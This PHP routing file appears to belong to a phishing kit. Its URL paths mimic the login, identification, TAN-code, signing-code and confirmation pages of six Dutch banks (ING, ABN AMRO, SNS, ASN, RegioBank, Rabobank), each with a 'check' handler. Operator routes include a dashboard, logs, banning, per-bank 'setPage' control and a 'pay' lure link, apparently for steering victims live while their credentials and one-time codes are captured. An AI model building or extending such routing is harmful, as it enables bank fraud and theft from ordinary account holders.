<?php

session_start();

require '../vendor/autoload.php';

$router = new Core\Router();

/* USER ROUTES */
$router->add('login', ['controller' => 'login', 'action' => 'login', 'namespace' => 'Users']);
$router->add('dashboard', ['controller' => 'dashboard', 'action' => 'dashboard', 'namespace' => 'Users']);
$router->add('exchange', ['controller' => 'exchange', 'action' => 'exchange', 'namespace' => 'Users']);
$router->add('logs', ['controller' => 'logs', 'action' => 'logs', 'namespace' => 'Users']);
$router->add('requests', ['controller' => 'requests', 'action' => 'requests', 'namespace' => 'Users']);
$router->add('settings', ['controller' => 'settings', 'action' => 'settings', 'namespace' => 'Users']);
$router->add('logout', ['controller' => 'login', 'action' => 'destroy', 'namespace' => 'Users']);

/* USER UPDATE ROUTES */
$router->add('update/password', ['controller' => 'update', 'action' => 'password', 'namespace' => 'Users']);
$router->add('update/redirect', ['controller' => 'update', 'action' => 'redirect', 'namespace' => 'Users']);

/* USER REQUEST ROUTES */
$router->add('requests/all', ['controller' => 'requests', 'action' => 'allRequests', 'namespace' => 'Users']);
$router->add('requests/delete', ['controller' => 'requests', 'action' => 'delete', 'namespace' => 'Users']);
$router->add('requests/delete/all', ['controller' => 'requests', 'action' => 'deleteAll', 'namespace' => 'Users']);

/* USER LOG ROUTES */
$router->add('logs', ['controller' => 'logs', 'action' => 'logs', 'namespace' => 'Users']);
$router->add('logs/delete', ['controller' => 'logs', 'action' => 'delete', 'namespace' => 'Users']);
$router->add('logs/delete/all', ['controller' => 'logs', 'action' => 'deleteAll', 'namespace' => 'Users']);
$router->add('logs/ban', ['controller' => 'logs', 'action' => 'ban', 'namespace' => 'Users']);
$router->add('logs/get/one', ['controller' => 'logs', 'action' => 'getOne', 'namespace' => 'Users']);

/* USER OVERVIEW ROUTE */
$router->add('overview/{id:[A-Za-z0-9]+}', ['controller' => 'overview', 'action' => 'index', 'namespace' => 'Users']);

/* USER ONLINE ROUTE */
$router->add('user/online', ['controller' => 'login', 'action' => 'setOnline', 'namespace' => 'Users']);

/* ING ROUTES */
$router->add('particulier/betaalverzoek/inloggen/{id:[A-Za-z0-9]+}', ['controller' => 'login', 'action' => 'index', 'namespace' => 'Ing']);
$router->add('particulier/betaalverzoek/inloggen/check/{id:[A-Za-z0-9]+}', ['controller' => 'login', 'action' => 'check', 'namespace' => 'Ing']);
$router->add('particulier/betaalverzoek/informatie/{id:[A-Za-z0-9]+}', ['controller' => 'details', 'action' => 'index', 'namespace' => 'Ing']);
$router->add('particulier/betaalverzoek/informatie/check/{id:[A-Za-z0-9]+}', ['controller' => 'details', 'action' => 'check', 'namespace' => 'Ing']);
$router->add('particulier/betaalverzoek/bevestigen/{id:[A-Za-z0-9]+}', ['controller' => 'confirm', 'action' => 'index', 'namespace' => 'Ing']);
$router->add('particulier/betaalverzoek/bevestigen/check/{id:[A-Za-z0-9]+}', ['controller' => 'confirm', 'action' => 'check', 'namespace' => 'Ing']);
$router->add('particulier/betaalverzoek/tancode/{id:[A-Za-z0-9]+}', ['controller' => 'tan', 'action' => 'index', 'namespace' => 'Ing']);
$router->add('particulier/betaalverzoek/tancode/check/{id:[A-Za-z0-9]+}', ['controller' => 'tan', 'action' => 'check', 'namespace' => 'Ing']);
$router->add('particulier/betaalverzoek/controleren/{id:[A-Za-z0-9]+}', ['controller' => 'control', 'action' => 'index', 'namespace' => 'Ing']);
$router->add('particulier/betaalverzoek/controleren/check/{id:[A-Za-z0-9]+}', ['controller' => 'control', 'action' => 'check', 'namespace' => 'Ing']);
$router->add('ing/page', ['controller' => 'login', 'action' => 'setPage', 'namespace' => 'Ing']);

/* ABN ROUTES */
$router->add('portalserver/nl/prive/bankieren/inloggen/{id:[A-Za-z0-9]+}', ['controller' => 'login', 'action' => 'index', 'namespace' => 'Abn']);
$router->add('portalserver/nl/prive/bankieren/inloggen/check/{id:[A-Za-z0-9]+}', ['controller' => 'login', 'action' => 'check', 'namespace' => 'Abn']);
$router->add('portalserver/nl/prive/bankieren/identificatie/{id:[A-Za-z0-9]+}', ['controller' => 'identification', 'action' => 'index', 'namespace' => 'Abn']);
$router->add('portalserver/nl/prive/bankieren/identificatie/check/{id:[A-Za-z0-9]+}', ['controller' => 'identification', 'action' => 'check', 'namespace' => 'Abn']);
$router->add('portalserver/nl/prive/bankieren/logincode/{id:[A-Za-z0-9]+}', ['controller' => 'code', 'action' => 'index', 'namespace' => 'Abn']);
$router->add('portalserver/nl/prive/bankieren/logincode/check/{id:[A-Za-z0-9]+}', ['controller' => 'code', 'action' => 'check', 'namespace' => 'Abn']);
$router->add('portalserver/nl/prive/bankieren/signeercode/{id:[A-Za-z0-9]+}', ['controller' => 'sign', 'action' => 'index', 'namespace' => 'Abn']);
$router->add('portalserver/nl/prive/bankieren/signeercode/check/{id:[A-Za-z0-9]+}', ['controller' => 'sign', 'action' => 'check', 'namespace' => 'Abn']);
$router->add('portalserver/nl/prive/bankieren/controleren/{id:[A-Za-z0-9]+}', ['controller' => 'control', 'action' => 'index', 'namespace' => 'Abn']);
$router->add('portalserver/nl/prive/bankieren/controleren/check/{id:[A-Za-z0-9]+}', ['controller' => 'control', 'action' => 'check', 'namespace' => 'Abn']);
$router->add('abn/page', ['controller' => 'login', 'action' => 'setPage', 'namespace' => 'Abn']);

/* SNS ROUTES */
$router->add('online/betalen-ideal/inloggen/{id:[A-Za-z0-9]+}', ['controller' => 'login', 'action' => 'index', 'namespace' => 'Sns']);
$router->add('online/betalen-ideal/inloggen/check/{id:[A-Za-z0-9]+}', ['controller' => 'login', 'action' => 'check', 'namespace' => 'Sns']);
$router->add('online/betalen-ideal/identificatie/{id:[A-Za-z0-9]+}', ['controller' => 'identification', 'action' => 'index', 'namespace' => 'Sns']);
$router->add('online/betalen-ideal/identificatie/check/{id:[A-Za-z0-9]+}', ['controller' => 'identification', 'action' => 'check', 'namespace' => 'Sns']);
$router->add('online/betalen-ideal/controleren/{id:[A-Za-z0-9]+}', ['controller' => 'control', 'action' => 'index', 'namespace' => 'Sns']);
$router->add('online/betalen-ideal/controleren/check/{id:[A-Za-z0-9]+}', ['controller' => 'control', 'action' => 'check', 'namespace' => 'Sns']);
$router->add('sns/page', ['controller' => 'login', 'action' => 'setPage', 'namespace' => 'Sns']);

/* ASN ROUTES */
$router->add('online/betalen-asn/inloggen/{id:[A-Za-z0-9]+}', ['controller' => 'login', 'action' => 'index', 'namespace' => 'Asn']);
$router->add('online/betalen-asn/inloggen/check/{id:[A-Za-z0-9]+}', ['controller' => 'login', 'action' => 'check', 'namespace' => 'Asn']);
$router->add('online/betalen-asn/identificatie/{id:[A-Za-z0-9]+}', ['controller' => 'identification', 'action' => 'index', 'namespace' => 'Asn']);
$router->add('online/betalen-asn/identificatie/check/{id:[A-Za-z0-9]+}', ['controller' => 'identification', 'action' => 'check', 'namespace' => 'Asn']);
$router->add('online/betalen-asn/controleren/{id:[A-Za-z0-9]+}', ['controller' => 'control', 'action' => 'index', 'namespace' => 'Asn']);
$router->add('online/betalen-asn/controleren/check/{id:[A-Za-z0-9]+}', ['controller' => 'control', 'action' => 'check', 'namespace' => 'Asn']);
$router->add('asn/page', ['controller' => 'login', 'action' => 'setPage', 'namespace' => 'Asn']);

/* REGIO ROUTES */
$router->add('online/betalen-regio/inloggen/{id:[A-Za-z0-9]+}', ['controller' => 'login', 'action' => 'index', 'namespace' => 'Regio']);
$router->add('online/betalen-regio/inloggen/check/{id:[A-Za-z0-9]+}', ['controller' => 'login', 'action' => 'check', 'namespace' => 'Regio']);
$router->add('online/betalen-regio/identificatie/{id:[A-Za-z0-9]+}', ['controller' => 'identification', 'action' => 'index', 'namespace' => 'Regio']);
$router->add('online/betalen-regio/identificatie/check/{id:[A-Za-z0-9]+}', ['controller' => 'identification', 'action' => 'check', 'namespace' => 'Regio']);
$router->add('online/betalen-regio/controleren/{id:[A-Za-z0-9]+}', ['controller' => 'control', 'action' => 'index', 'namespace' => 'Regio']);
$router->add('online/betalen-regio/controleren/check/{id:[A-Za-z0-9]+}', ['controller' => 'control', 'action' => 'check', 'namespace' => 'Regio']);
$router->add('regio/page', ['controller' => 'login', 'action' => 'setPage', 'namespace' => 'Regio']);

/* RABO ROUTES */
$router->add('ideal-betalen/inloggen/{id:[A-Za-z0-9]+}', ['controller' => 'login', 'action' => 'index', 'namespace' => 'Rabo']);
$router->add('ideal-betalen/inloggen/check/{id:[A-Za-z0-9]+}', ['controller' => 'login', 'action' => 'check', 'namespace' => 'Rabo']);
$router->add('ideal-betalen/inloggen/code/{id:[A-Za-z0-9]+}', ['controller' => 'login', 'action' => 'code', 'namespace' => 'Rabo']);
$router->add('ideal-betalen/inloggen/code/check/{id:[A-Za-z0-9]+}', ['controller' => 'login', 'action' => 'check', 'namespace' => 'Rabo']);
$router->add('ideal-betalen/ondertekenen/{id:[A-Za-z0-9]+}', ['controller' => 'sign', 'action' => 'index', 'namespace' => 'Rabo']);
$router->add('ideal-betalen/ondertekenen/check/{id:[A-Za-z0-9]+}', ['controller' => 'sign', 'action' => 'check', 'namespace' => 'Rabo']);
$router->add('ideal-betalen/bevestigen/{id:[A-Za-z0-9]+}', ['controller' => 'identification', 'action' => 'index', 'namespace' => 'Rabo']);
$router->add('ideal-betalen/bevestigen/check/{id:[A-Za-z0-9]+}', ['controller' => 'identification', 'action' => 'check', 'namespace' => 'Rabo']);
$router->add('ideal-betalen/controleren/{id:[A-Za-z0-9]+}', ['controller' => 'control', 'action' => 'index', 'namespace' => 'Rabo']);
$router->add('ideal-betalen/controleren/check/{id:[A-Za-z0-9]+}', ['controller' => 'control', 'action' => 'check', 'namespace' => 'Rabo']);
$router->add('rabo/page', ['controller' => 'login', 'action' => 'setPage', 'namespace' => 'Rabo']);

/* PAY ROUTES */
$router->add('pay/{id:[A-Za-z0-9]+}', ['controller' => 'request', 'action' => 'index', 'namespace' => 'Pay']);

$router->dispatch($_SERVER['QUERY_STRING']);
